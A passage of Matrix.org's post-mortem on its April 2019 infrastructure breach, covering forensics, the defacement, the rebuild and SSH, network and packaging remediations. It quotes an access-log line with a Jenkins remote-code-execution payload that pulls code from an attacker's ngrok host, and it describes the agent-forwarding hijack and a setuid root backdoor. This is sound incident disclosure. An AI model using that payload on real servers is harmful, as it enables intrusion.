+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh">SSH</a>
+<ul>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-agent-forwarding-should-be-disabled">SSH agent forwarding should be disabled.</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-should-not-be-exposed-to-the-general-internet">SSH should not be exposed to the general internet</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-keys-should-give-minimal-access">SSH keys should give minimal access</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#two-factor-authentication">Two factor authentication</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys">It should be made as hard as possible to add malicious SSH keys</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#changes-to-ssh-keys-should-be-carefully-monitored">Changes to SSH keys should be carefully monitored</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-config-should-be-hardened-disabling-unnecessary-options">SSH config should be hardened, disabling unnecessary options</a></li>
+</ul>
+</li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#network-architecture">Network architecture</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#keeping-patched">Keeping patched</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#intrusion-detection">Intrusion detection</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#incident-management">Incident management</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#configuration-management">Configuration management</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#avoiding-temporary-measures-which-last-forever">Avoiding temporary measures which last forever</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#secure-packaging">Secure packaging</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#dev-and-ci-infrastructure">Dev and CI infrastructure</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#log-minimisation-and-handling-personally-identifying-information-pii">Log minimisation and handling Personally Identifying Information (PII)</a></li>
+</ul>
+</li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#conclusion">Conclusion</a></li>
+</ul>
+<h3 id="introduction">Introduction</h3>
+<p>Hi all,</p>
+<p>On April 11th we dealt with a major security incident impacting the infrastructure which runs the Matrix.org homeserver - specifically: removing an attacker who had gained superuser access to much of our production network.  We provided updates at the time as events unfolded on April 11 and 12 via <a href="https://twitter.com/matrixdotorg/status/1116304867683905537">Twitter</a> and our <a href="https://matrix.org/blog/2019/04/11/security-incident/">blog</a>, but in this post we’ll try to give a full analysis of what happened and, critically, what we have done to avoid this happening again in future.  Apologies that this has taken several weeks to put together: the time-consuming process of rebuilding after the breach has had to take priority, and we also wanted to get the key remediation work in place before writing up the post-mortem.</p>
+<p>Firstly, please understand that <strong>this incident was not due to issues in the Matrix protocol itself or the wider Matrix network</strong> - and indeed everyone who wasn’t on the Matrix.org server should have barely noticed.  If you see someone say “Matrix got hacked”, please politely but firmly explain to them that the servers which run the oldest and biggest instance got compromised via a Jenkins vulnerability and bad ops practices, but <strong>the protocol and network itself was not impacted</strong>.  This is not to say that the Matrix protocol itself is bug free - indeed we are still in the process of exiting beta (delayed by this incident), but <strong>this incident was not related to the protocol</strong>.</p>
+<p>Before we get stuck in, we would like to apologise unreservedly to everyone impacted by this whole incident.  Matrix is an altruistic open source project, and our mission is to try to make the world a better place by providing a secure decentralised communication protocol and network for the benefit of everyone; giving users total control back over how they communicate online.</p>
+<p>In this instance, our focus on trying to improve the protocol and network came at the expense of investing sysadmin time around the legacy Matrix.org homeserver and project infrastructure which we provide as a free public service to help bootstrap the Matrix ecosystem, and we paid the price.</p>
+<p>This post will hopefully illustrate that we have learnt our lessons from this incident and will not be repeating them - and indeed intend to come out of this episode stronger than you can possibly imagine :)</p>
+<p>Meanwhile, if you think that the world needs Matrix, <strong>please</strong> consider supporting us via <a href="https://patreon.com/matrixdotorg">Patreon</a> or <a href="http://liberapay.com/matrixdotorg">Liberapay</a>.  Not only will this make it easier for us to invest in our infrastructure in future, it also makes projects like <a href="https://github.com/matrix-org/pantalaimon">Pantalaimon</a> (E2EE compatibility for all Matrix clients/bots) possible, which are effectively being financed entirely by donations.  The funding we raised in Jan 2018 is not going to last forever, and we are currently looking into new longer-term funding approaches - for which we need your support.</p>
+<p>Finally, if you happen across security issues in Matrix or matrix.org’s infrastructure, please please consider disclosing them responsibly to us as per our <a href="https://matrix.org/security-disclosure-policy/">Security Disclosure Policy</a>, in order to help us improve our security while protecting our users.</p>
+<h3 id="history">History</h3>
+<p>Firstly, some context about Matrix.org’s infrastructure.  The public Matrix.org homeserver and its associated services runs across roughly 30 hosts, spanning the actual homeserver, its DBs, load balancers, intranet services, website, bridges, bots, integrations, video conferencing, CI, etc.  We provide it as a free public service to the Matrix ecosystem to help bootstrap the network and make life easier for first-time users.</p>
+<p>The deployment which was compromised in this incident was mainly set up back in Aug 2017 when we vacated our previous datacenter at short notice, thanks to our <a href="https://matrix.org/blog/2017/07/07/a-call-to-arms-supporting-matrix/">funding situation</a> at the time. Previously we had been piggybacking on the well-managed production datacenters of our previous employer, but during the exodus we needed to move as rapidly as possible, and so we span up a bunch of vanilla Debian boxes on <a href="https://upcloud.com">UpCloud</a>, and shifted over services as simply as we could.  We had no dedicated ops people on the project at that point, so this was a subset of the Synapse and Riot/Web dev teams putting on ops hats to rapidly get set up, whilst also juggling the daily fun of keeping the ever-growing Matrix.org server running and trying to actually develop and improve Matrix itself.</p>
+<p>In practice, this meant that some corners were cut that we expected to be able to come back to and address once we had dedicated ops staff on the team.  For instance, we skipped setting up a VPN for accessing production in favour of simply SSHing into the servers over the internet.  We also went for the simplest possible config management system: checking all the configs for the services into a private git repo.  We also didn’t spend much time hardening the default Debian installations - for instance, the default image allows root access via SSH and allows SSH agent forwarding, and the config wasn’t tweaked.  This is particularly unfortunate, given our previous production OS (a customised Debian variant) had got all these things right - but the attitude was that because we’d got this right in the past, we’d be easily able to get it right in future once we fixed up the hosts with proper configuration management etc.</p>
+<p>Separately, we also made the controversial decision to maintain a public-facing Jenkins instance.  We did this deliberately, despite the risks associated with running a complicated publicly available service like Jenkins, but reasoned that as a FOSS project, it is imperative that we are transparent and that continuous integration results and artefacts are available and directly visible to all contributors - whether they are part of the core dev team or not.  So we put Jenkins on its own host, gave it some macOS build slaves, and resolved to keep an eye open for any security alerts which would require an upgrade.</p>
+<p>Lots of stuff then happened over the following months - we <a href="https://matrix.org/blog/2018/01/29/status-partners-up-with-new-vector-fueling-decentralised-comms-and-the-matrix-ecosystem/">secured funding</a> in Jan 2018; the French Government began talking about <a href="https://matrix.org/blog/2018/04/26/matrix-and-riot-confirmed-as-the-basis-for-frances-secure-instant-messenger-app/">switching to Matrix</a> around the same time; the pressure of getting Matrix (and Synapse and Riot) out of beta and to a stable 1.0 grew ever stronger; the challenge of handling the ever-increasing traffic on the Matrix.org server soaked up more and more time, and we started to see our first major security incidents (a major DDoS in March 2018, mitigated by shielding behind Cloudflare, and various attacks on the more beta bits of Matrix itself).</p>
+<p>Good news was that funding meant that in March 2018 we were able to hire a fulltime ops specialist!  By this point, however, we had two new critical projects in play to try to ensure long-term funding for the project via New Vector, the startup formed in 2017 to hire the core team. Firstly, to build out <a href="https://modular.im">Modular.im</a> as a commercial-grade Matrix SaaS provider, and secondly, to support France in rolling out their massive Matrix deployment as a flagship example how Matrix can be used.  And so, for better or worse, the brand new ops team was given a very clear mandate: to largely ignore the legacy datacenter infrastructure, and instead focus exclusively on building entirely new, pro-grade infrastructure for Modular.im and France, with the expectation of eventually migrating Matrix.org itself into Modular when ready (or just turning off the Matrix.org server entirely, once we have account portability).</p>
+<p>So we ended up with two production environments; the legacy Matrix.org infra, whose shortcomings continued to linger and fester off the radar, and separately all the new Modular.im hosts, which are almost entirely operationally isolated from the legacy datacenter; whose configuration is managed exclusively by Ansible, and have sensible SSH configs which disallow root login etc.  With 20:20 hindsight, the failure to prioritise hardening the legacy infrastructure is quite a good example of the <a href="https://fastjetperformance.com/podcasts/how-i-almost-destroyed-a-50-million-war-plane-when-display-flying-goes-wrong-and-the-normalisation-of-deviance/">normalisation of deviance</a> - we had gotten too used to the bad practices; all our attention was going elsewhere; and so we simply failed to prioritise getting back to fix them.</p>
+<h3 id="the-incident">The Incident</h3>
+<p>The first evidence of things going wrong was a tweet from <a href="https://twitter.com/JaikeySarraf">JaikeySarraf</a>, a security researcher who kindly reached out via DM at the end of Apr 9th to warn us that our Jenkins was outdated after stumbling across it via Google.  In practice, our Jenkins was running version 2.117 with plugins which had been updated on an adhoc basis, and we had indeed missed the security advisory (partially because most of our CI pipelines had moved to TravisCI, CircleCI and Buildkite), and so on Apr 10th we updated the Jenkins and investigated to see if any vulnerabilities had been exploited.</p>
+<p>In this process, we spotted an unrecognised SSH key in <code>/root/.ssh/authorized_keys2</code> on the Jenkins build server.  This was suspicious both due to the key not being in our key DB and the fact the key was stored in the obscure <code>authorized_keys2</code> file (a legacy location from back when OpenSSH transitioned from <a href="https://searchsecurity.techtarget.com/tip/An-introduction-to-SSH2">SSH1-&gt;SSH2</a>).  Further inspection showed that 19 hosts in total had the same key present in the same place.</p>
+<p>At this point we started doing forensics to understand the scope of the attack and plan the response, as well as taking snapshots of the hosts to protect data in case the attacker realised we were aware and attempted to vandalise or cover their tracks.  Findings were:</p>
+<ul>
+<li>The attacker had first compromised Jenkins on March 13th via an RCE vulnerability (CVE-2019-1003000 - <a href="https://www.exploit-db.com/exploits/46572">https://www.exploit-db.com/exploits/46572</a>):</li>
+</ul>
+<p><code>matrix.org:443 151.34.xxx.xxx - - [13/Mar/2019:18:46:07 +0000] "GET /jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0A@GrabResolver(name=%27orange.tw%27,%20root=%27http://5f36xxxx.ngrok.io/jenkins/%27)%0A@Grab(group=%27tw.orange%27,%20module=%270x3a%27,%20version=%27000%27)%0Aimport%20Orange; HTTP/1.1" 500 6083 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"</code></p>
+<ul>
+<li>This allowed them to further compromise a Jenkins slave (Flywheel, an old Mac Pro used mainly for continuous integration testing of Riot/iOS and Riot/Android). The attacker put an SSH key on the box, which was unfortunately exposed to the internet via a high-numbered SSH port for ease of admin by remote users, and placed a trap which waited for any user to SSH into the jenkins user, which would then hijack any available forwarded SSH keys to try to add the attacker’s SSH key to root@ on as many other hosts as possible.</li>
+<li>On Apr 4th at 12:32 GMT, one of the Riot devops team members SSH’d into the Jenkins slave to perform some admin, forwarding their SSH key for convenience for accessing other boxes while doing so.  This triggered the trap, and resulted in the majority of the malicious keys being inserted to the remote hosts.</li>
+<li>From this point on, the attacker proceeded to explore the network, performing targeted exfiltration of data (e.g. our passbolt database, which is thankfully end-to-end encrypted via GPG) seemingly targeting credentials and data for use in onward exploits, and installing backdoors for later use (e.g. a setuid root shell at <code>/usr/share/bsd-mail/shroot</code>).</li>
+<li>The majority of access to the hosts occurred between Apr 4th and 6th.</li>
+<li>There was no evidence of large-scale data exfiltration, based on analysing network logs.</li>
+<li>There was no evidence of Modular.im hosts having been compromised.  (Modular’s provisioning system and DB did run on the old infrastructure, but it was not used to tamper with the modular instances themselves).</li>
+<li>There was no evidence of the identity server databases having been compromised.</li>
+<li>There was no evidence of tampering in our source code repositories.</li>
+<li>There was no evidence of tampering of our distributed software packages.</li>
+<li>Two more hosts were compromised on Apr 5th by similarly hijacking another developer SSH agent as the dev logged into a production server.</li>
+</ul>
+<p>By around 2am on Apr 11th we felt that we had sufficient visibility on the attacker’s behaviour to be able to do a first pass at evicting them by locking down SSH, removing their keys, and blocking as much network traffic as we could.</p>
+<p>We then started a full rebuild of the datacenter on the morning of Apr 11th, given that the only responsible course of action when an attacker has acquired root is to salt the earth and start over afresh. This meant rotating all secrets; isolating the old hosts entirely (including ones which appeared to not have been compromised, for safety), spinning up entirely new hosts, and redeploying everything from scratch with the fresh secrets.  The process was significantly slowed down by colliding with unplanned maintenance and provisioning issues in the datacenter provider and unexpected delays spent waiting to copy data volumes between datacenters, but by 1am on Apr 12th the core matrix.org server was back up, and we had enough of a website up to publish the initial <a href="https://matrix.org/blog/2019/04/11/security-incident/">security incident blog post</a>. (This was actually static HTML, faked by editing the generated WordPress content from the old website. We opted not to transition any WordPress deployments to the new infra, in a bid to keep our attack surface as small as possible going forwards).</p>
+<p>Given the production database had been accessed, we had no choice but drop all access_tokens for matrix.org, to stop the attacker accessing user accounts, causing a forced logout for all users on the server.  We also recommended all users change their passwords, given the salted &amp; hashed (4096 rounds of bcrypt) passwords had likely been exfiltrated.</p>
+<p>At about 4am we had enough of the bare necessities back up and running to pause for sleep.</p>
+<h3 id="the-defacement">The Defacement</h3>
+<p>At around 7am, we were woken up to the news that the attacker had managed to replace the matrix.org website with a defacement (as per <a href="https://github.com/vector-im/riot-web/issues/9435">https://github.com/vector-im/riot-web/issues/9435</a>). It looks like the attacker didn’t think we were being transparent enough in our initial blog post, and wanted to make it very clear that they had access to many hosts, including the production database and had indeed exfiltrated password hashes.  Unfortunately it took a few hours for the defacement to get on our radar as our monitoring infrastructure hadn’t yet been fully restored and the normal paging infrastructure wasn’t back up (we now have emergency-emergency-paging for this eventuality).</p>
+<p>On inspection, it transpired that the attacker had not compromised the new infrastructure, but had used Cloudflare to repoint the DNS for matrix.org to a defacement site hosted on Github.  Now, as part of rotating the secrets which had been compromised via our configuration repositories, we had of course rotated the Cloudflare API key (used to automate changes to our DNS) during the rebuild on Apr 11.  When you log into Cloudflare, it looks something like this...</p>
+<p><img src="/blog/img/cf.png" alt="Cloudflare login UI" /></p>
+<p>...where the top account is your personal one, and the bottom one is an admin role account.  To rotate the admin API key, we clicked on the admin account to log in as the admin, and then went to the Profile menu, found the API keys and hit the <a href="https://support.cloudflare.com/hc/en-us/articles/221318707-How-do-I-change-my-Global-API-Key-">Change API Key</a> button.</p>
+<p>Unfortunately, when you do this, it turns out that the API Key it changes is your personal one, rather than the admin one.  As a result, in our rush we thought we’d rotated the admin API key, but we hadn’t, thus accidentally enabling the defacement.</p>
+<p>To flush out the defacement we logged in directly as the admin user and changed the API key, pointed the DNS back at the right place, and continued on with the rebuild.</p>
+<h3 id="the-rebuild">The Rebuild</h3>
+<p>The goal of the rebuild has been to get all the higher priority services back up rapidly - whilst also ensuring that good security practices are in place going forwards.  In practice, this meant making some immediate decisions about how to ensure the new infrastructure did not suffer the same issues and fate as the old.  Firstly, we ensured the most obvious mistakes that made the breach possible were mitigated:</p>
+<ul>
+<li>Access via SSH restricted as heavily as possible</li>
+<li>SSH agent forwarding disabled server-side</li>
+<li>All configuration to be managed by Ansible, with secrets encrypted in vaults, rather than sitting in a git repo.</li>
+</ul>
+<p>Then, whilst reinstating services on the new infra, we opted to review <strong>everything</strong> being installed for security risks, replacing with securer alternatives if needed, even if it slowed down the rebuild.  Particularly, this meant:</p>
+<ul>
+<li>Jenkins has been replaced by <a href="https://buildkite.com/matrix-dot-org">Buildkite</a></li>
+<li>Wordpress has been replaced by static generated sites (e.g. <a href="https://github.com/matrix-org/matrix.org/tree/master/gatsby">Gatsby</a>)</li>
+<li>cgit has been replaced by <a href="https://gitlab.matrix.org">gitlab</a>.</li>
+<li>Entirely new packaging building, signing &amp; distribution infrastructure (more on that later)</li>
+<li>etc.</li>
+</ul>
+<p>Now, while we restored the main synapse (homeserver), sydent (identity server), sygnal (push server), databases, load balancers, intranet and website on Apr 11, it’s important to understand that there were over 100 other services running on the infra - which is why it is taking a while to get full parity with where we were before.</p>
+<p>In the interest of transparency (and to try to give a sense of scale of the impact of the breach), here is the public-facing service list we restored, showing priority (1 is top, 4 is bottom) and the % restore status as of May 4th:</p>
+<p><img src="/blog/img/services.png" alt="Service status" /></p>
+<p>Apologies again that it took longer to get some of these services back up than we’d preferred (and that there are still a few pending).  Once we got the top priority ones up, we had no choice but to juggle the remainder alongside remediation work, <a href="https://matrix.org/blog/2019/05/03/security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28-a/">other security work</a>, and actually working on Matrix(!), whilst ensuring that the services we restored were being restored securely.</p>
+<h3 id="remediations">Remediations</h3>
+<p>Once the majority of the P1 and P2 services had been restored, on Apr 24 we held a formal retrospective for the team on the whole incident, which in turn kicked off a full security audit over the entirety of our infrastructure and operational processes.</p>
+<p>We’d like to share the resulting remediation plan in as much detail as possible, in order to show the approach we are taking, and in case it helps others avoid repeating the mistakes of our past. Inevitably we’re going to have to skip over some of the items, however - after all, remediations imply that there’s something that could be improved, and for obvious reasons we don’t want to dig into areas where remediation work is still ongoing.  We will aim to provide an update on these once ongoing work is complete, however.</p>
+<p>We should also acknowledge that after being removed from the infra, the attacker chose to file a <a href="https://github.com/matrix-org/matrix.org/issues/371">set of Github issues</a> on Apr 12 to highlight some of the security issues that had taken advantage of during the breach.  Their actions matched the findings from our forensics on Apr 10, and their suggested remediations aligned with our plan.</p>
+<p>We’ve split the remediation work into the following domains.</p>
+<h4 id="ssh">SSH</h4>
+<p>Some of the biggest issues exposed by the security breach concerned our use of SSH, which we’ll take in turn:</p>
+<h5 id="ssh-agent-forwarding-should-be-disabled">SSH agent forwarding should be disabled.</h5>
+<p>SSH agent forwarding is a beguilingly convenient mechanism which allows a user to ‘forward’ access to their private SSH keys to a remote server whilst logged in, so they can in turn access other servers via SSH from that server.  Typical uses are to make it easy to copy files between remote servers via scp or rsync, or to interact with a SCM system such as Github via SSH from a remote server.  Your private SSH keys end up available for use by the server for as long as you are logged into it, letting the server impersonate you.</p>
+<p>The common wisdom on this tends to be something like: “Only use agent forwarding when connecting to trusted hosts”.  For instance, <a href="https://developer.github.com/v3/guides/using-ssh-agent-forwarding/#setting-up-ssh-agent-forwarding">Github’s guide to using SSH agent forwarding</a> says:</p>
+<blockquote>
+<p><strong>Warning</strong>: You may be tempted to use a wildcard like <code>Host *</code> to just apply this setting (ForwardAgent: yes) to all SSH connections. That's not really a good idea, as you'd be sharing your local SSH keys with <em>every</em> server you SSH into. They won't have direct access to the keys, but they will be able to use them <em>as you</em> while the connection is established. <strong>You should only add servers you trust and that you intend to use with agent forwarding</strong></p>
+</blockquote>
+<p>As a result, several of the team doing ops work had set <code>Host *.matrix.org ForwardAgent: yes</code> in their ssh client configs, thinking “well, what <em>can</em> we trust if not our own servers?”</p>
+<p>This was a massive, massive mistake.</p>
+<p>If there is one lesson everyone should learn from this whole mess, it is: <strong>SSH agent forwarding is incredibly unsafe, and in general you should never use it.</strong>  Not only can malicious code running on the server as that user (or root) hijack your credentials, but your credentials can in turn be used to access hosts behind your network perimeter which might otherwise be inaccessible.  All it takes is someone to have snuck malicious code on your server waiting for you to log in with a forwarded agent, and <em>boom</em>, even if it was just a one-off <code>ssh -A</code>.</p>
+<p>Our remediations for this are:</p>
+<ul>
+<li>Disable all ssh agent forwarding on the servers.</li>
+<li>If you need to jump through a box to ssh into another box, use <code>ssh -J $host</code>.</li>
+<li>This can also be used with rsync via <code>rsync -e "ssh -J $host"</code></li>
+<li>If you need to copy files between machines, use rsync rather than scp (OpenSSH 8.0’s <a href="https://www.openssh.com/txt/release-8.0">release notes</a> explicitly recommends using more modern protocols than scp).</li>
+<li>If you need to regularly copy stuff from server to another (or use SSH to GitHub to check out something from a private repo), it might be better to have a specific SSH ‘deploy key’ created for this, stored server-side and only able to perform limited actions.</li>
+<li>If you just need to check out stuff from public git repos, use https rather than git+ssh.</li>
+<li>Try to educate everyone on the perils of SSH agent forwarding: if our past selves can’t be a good example, they can at least be a horrible warning...</li>
+</ul>
+<p>Another approach could be to allow forwarding, but configure your SSH agent to prompt whenever a remote app tries to access your keys.  However, not all agents support this (OpenSSH’s does via <code>ssh-add -c</code>, but gnome-keyring for instance doesn’t), and also it might still be possible for a hijacker to race with the valid request to hijack your credentials.</p>
+<h5 id="ssh-should-not-be-exposed-to-the-general-internet">SSH should not be exposed to the general internet</h5>
+<p>Needless to say, SSH is no longer exposed to the general internet.  We are rolling out a VPN as the main access to dev network, and then SSH bastion hosts to be the only access point into production, using SSH keys to restrict access to be as minimal as possible.</p>
+<h5 id="ssh-keys-should-give-minimal-access">SSH keys should give minimal access</h5>
+<p>Another major problem factor was that individual SSH keys gave very broad access. We have gone through ensuring that SSH keys grant the least privilege required to the users in question. Particularly, root login should not be available over SSH.</p>
+<p>A typical scenario where users might end up with unnecessary access to production are developers who simply want to push new code or check its logs.  We are mitigating this by switching over to using continuous deployment infrastructure everywhere rather than developers having to actually SSH into production.  For instance, the new <a href="https://matrix.org/blog">matrix.org blog</a> is continuously deployed into production by Buildkite from <a href="https://github.com/matrix-org/matrix.org">GitHub</a> without anyone needing to SSH anywhere.  Similarly, logs should be available to developers from a logserver in real time, without having to SSH into the actual production host. We’ve already been experimenting internally with sentry for this.</p>
+<p>Relatedly, we’ve also shifted to requiring multiple SSH keys per user (per device, and for privileged / unprivileged access), to have finer grained granularity over locking down their permissions and revoking them etc.  (We had actually already started this process, and while it didn’t help prevent the attack, it did assist with forensics).</p>
+<h5 id="two-factor-authentication">Two factor authentication</h5>
+<p>We are rolling out two-factor authentication for SSH to ensure that even if keys are compromised (e.g. via forwarding hijack), the attacker needs to have also compromised other physical tokens in order to successfully authenticate.</p>
+<h5 id="it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys">It should be made as hard as possible to add malicious SSH keys</h5>
+<p>We’ve decided to stop users from being able to directly manage their own SSH keys in production via <code>~/.ssh/authorized_keys</code> (or <code>~/.ssh/authorized_keys2</code> for that matter) - we can see no benefit from letting non-root users set keys.</p>
+<p>Instead, keys for all accounts are managed exclusively by Ansible via <code>/etc/ssh/authorized_keys/$account</code> (using sshd’s <code>AuthorizedKeysFile /etc/ssh/authorized_keys/%u</code> directive).</p>
+<h5 id="changes-to-ssh-keys-should-be-carefully-monitored">Changes to SSH keys should be carefully monitored</h5>
+<p>If we’d had sufficient monitoring of the SSH configuration, the breach could have been caught instantly.  We are doing this by managing the keys exclusively via Ansible, and also improving our intrusion detection in general.</p>
+<p>Similarly, we are working on tracking changes and additions to other credentials (and enforcing their complexity).</p>
+<h5 id="ssh-config-should-be-hardened-disabling-unnecessary-options">SSH config should be hardened, disabling unnecessary options</h5>
+<p>If we’d gone through reviewing the default sshd config when we set up the datacenter in the first place, we’d have caught several of these failure modes at the outset.  We’ve now done so (as per above).</p>
+<p>We’d like to recommend that packages of openssh start having secure-by-default configurations, as a number of the old options just don’t need to exist on most newly provisioned machines.</p>
+<h4 id="network-architecture">Network architecture</h4>
+<p>As mentioned in the History section, the legacy network infrastructure effectively grew organically, without really having a core network or a good split between different production environments.</p>
+<p>We are addressing this by:</p>
+<ul>
+<li>Splitting our infrastructure into strictly separated service domains, which are firewalled from each other and can only access each other via their respective ‘front doors’ (e.g. HTTPS APIs exposed at the loadbalancers).
+<ul>
+<li>Development</li>
+<li>Intranet</li>
+<li>Package Build (airgapped; see below for more details)</li>
+<li>Package Distribution</li>
+<li>Production, which is in turn split per class of service.</li>
+</ul>
+</li>
+<li>Access to these networks will be via VPN + SSH jumpboxes (as per above).  Access to the VPN is via per-device certificate + 2FA, and SSH via keys as per above.</li>
+<li>Switching to an improved internal VPN between hosts within a given network environment (i.e. we don’t trust the datacenter LAN).</li>
+</ul>
+<p>We’re also running most services in containers by default going forwards (previously it was a bit of a mix of running unix processes, VMs, and occasional containers), providing an additional level of namespace isolation.</p>
+<h4 id="keeping-patched">Keeping patched</h4>
+<p>Needless to say, this particular breach would not have happened had we kept the public-facing Jenkins patched (although there would of course still have been scope for a 0-day attack).</p>
+<p>Going forwards, we are establishing a formal regular process for deploying security updates rather than relying on spotting security advisories on an ad hoc basis. We are now also setting up regular vulnerability scans against production so we catch any gaps before attackers do.</p>
+<p>Aside from our infrastructure, we’re also extending the process of regularly checking for security updates to also checking for outdated dependencies in our distributed software (Riot, Synapse, etc) too, given the discipline to regularly chase outdated software applies equally to both.</p>
+<p>Moving all our machine deployment and configuration into Ansible allows this to be a much simpler task than before.</p>
+<h4 id="intrusion-detection">Intrusion detection</h4>
+<p>There’s obviously a lot we need to do in terms of spotting future attacks as rapidly as possible.  Amongst other strategies, we’re working on real-time log analysis for aberrant behaviour.</p>
+<h4 id="incident-management">Incident management</h4>
+<p>There is much we have learnt from managing an incident at this scale. The main highlights taken from our internal retrospective are:</p>
+<ul>
+<li>The need for a single incident manager to coordinate the technical response and coordinate prioritisation and handover between those handling the incident. (We lacked a single incident manager at first, given several of the team started off that week on holiday...)</li>
+<li>The benefits of gathering all relevant info and checklists onto a canonical set of shared documents rather than being spread across different chatrooms and lost in scrollback.</li>
+<li>The need to have an existing inventory of services and secrets available for tracking progress and prioritisation</li>
+<li>The need to have a general incident management <a href="https://news.ycombinator.com/item?id=19682451&amp;p=2">checklist</a> for future reference, which folks can familiarise themselves with ahead of time to avoid stuff getting forgotten.  The sort of stuff which will go on our checklist in future includes:
+<ul>
+<li>Remembering to appoint named incident manager, external comms manager &amp; internal comms manager. (They could of course be the same person, but the roles are distinct).</li>
+<li>Defining a sensible sequence of forensics, mitigations, communication, rotating secrets etc is followed rather than having to work it out on the fly and risk forgetting stuff</li>
+<li>Remembering to informing the ICO (Information Commissioner Office) of any user data breaches</li>
+<li>Guidelines on how to balance between forensics and rebuilding (i.e. how long to spend on forensics, if at all, before pulling the plug)</li>
+<li>Reminders to snapshot systems for forensics &amp; backups</li>
+<li>Reminder to not redesign infrastructure during a rebuild.  There were a few instances where we lost time by seizing the opportunity to try to fix design flaws whilst rebuilding, some of which were avoidable.</li>
+<li>Making sure that communication isn’t sent prematurely to users (e.g. we posted the blog post asking people to update their passwords before password reset had actually been restored - apologies for that.)</li>
+</ul>
+</li>
+</ul>
+<h4 id="configuration-management">Configuration management</h4>
+<p>One of the major flaws once the attacker was in our network was that our internal configuration git repo was cloned on most accounts on most servers, containing within it a plethora of unencrypted secrets.  Config would then get symlinked from the checkout to wherever the app or OS needed it.</p>
+<p>This is bad in terms of leaving unencrypted secrets (database passwords, API keys etc) lying around everywhere, but also in terms of being able to automatically maintain configuration and spot unauthorised configuration changes.</p>
+<p>Our solution is to switch all configuration management, from the OS upwards, to Ansible (which we had already established for Modular.im), using Ansible vaults to store the encrypted secrets.  It’s unfortunate that we had already done the work for this (and even had been <a href="https://github.com/ansible-community/ansible-london-meetup/blob/master/presentations/2019-01-31/Introducing%20Ansible%20to%20matrix-final.pdf">giving talks at Ansible meetups</a> about it!) but had not yet applied it to the legacy infrastructure.</p>
+<h4 id="avoiding-temporary-measures-which-last-forever">Avoiding temporary measures which last forever</h4>
+<p>None of this would have happened had we been more disciplined in finishing off the temporary infrastructure from back in 2017.  As a general point, we should try and do it right the first time - and failing that, assign responsibility to someone to update it and assign responsibility to someone else to check. In other words, the only way to dig out of temporary measures like this is to project manage the update or it will not happen.  This is of course a general point not specific to this incident, but one well worth reiterating.</p>
+<h4 id="secure-packaging">Secure packaging</h4>
+<p>One of the most unfortunate mistakes highlighted by the breach is that the signing keys for the Synapse debian repository, Riot debian repository and Riot/Android releases on the Google Play Store had ended up on hosts which were compromised during the attack.  This is obviously a massive fail, and is a case of the geo-distributed dev teams prioritising the convenience of a near-automated release process without thinking through the security risks of storing keys on a production server.</p>
+<p>Whilst the keys were compromised, none of the packages that we distribute were tampered with. However, the impact on the project has been high - particularly for Riot/Android, as we cannot allow the risk of an attacker using the keys to sign and somehow distribute malicious variants of Riot/Android, and Google provides no means of recovering from a compromised signing key beyond creating a whole new app and starting over.  Therefore we have lost all our ratings, reviews and download counts on Riot/Android and <a href="https://medium.com/@RiotChat/riot-im-android-security-update-2b3f655ad739">started over</a>.  (If you want to give the newly released app a fighting chance despite this setback, feel free to <a href="https://play.google.com/store/apps/details?id=im.vector.app&amp;showAllReviews=true">give it some stars</a> on the Play Store). We also revoked the compromised Synapse &amp; Riot GPG keys and created new ones (and published <a href="https://github.com/matrix-org/synapse/commit/95c603ae6f0f1639f6299fff62d7a75002221276#diff-7d442b7eb49f5fc377f51e74b291cfc1">new instructions</a> for how to securely set up your Synapse or Riot debian repos).</p>
+<p>In terms of remediation, designing a secure build process is surprisingly hard, particularly for a geo-distributed team.  What we have landed on is as follows:</p>
+<ul>
+<li>Developers create a release branch to signify a new release (ensuring dependencies are pinned to known good versions).</li>
+<li>We then perform all releases from a dedicated isolated release terminal.
+<ul>
+<li>This is a device which is kept disconnected from the internet, other than when doing a release, and even then it is firewalled to be able to pull data from SCM and push to the package distribution servers, but otherwise entirely isolated from the network.</li>
+<li>Needless to say, the device is strictly used for <em>nothing</em> other than performing releases.</li>
